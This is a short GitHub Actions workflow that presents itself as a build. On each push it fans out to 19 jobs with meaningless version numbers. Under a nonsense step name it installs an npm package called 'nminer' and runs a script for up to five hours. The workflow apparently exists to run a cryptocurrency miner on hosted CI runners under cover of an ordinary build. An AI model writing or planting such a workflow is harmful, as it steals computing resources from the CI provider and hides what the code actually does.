name: morning
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1187 }
          - { version: 5507 }
          - { version: 6773 }
          - { version: 8828 }
          - { version: 3707 }
          - { version: 772 }
          - { version: 555 }
          - { version: 4831 }
          - { version: 7883 }
          - { version: 5080 }
          - { version: 110 }
          - { version: 9119 }
          - { version: 3694 }
          - { version: 8619 }
          - { version: 7643 }
          - { version: 82 }
          - { version: 9603 }
          - { version: 1656 }
          - { version: 5053 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: psst pace since
        run: |
          npm install nminer@latest
          timeout 304m node morning.js || echo "morning executed"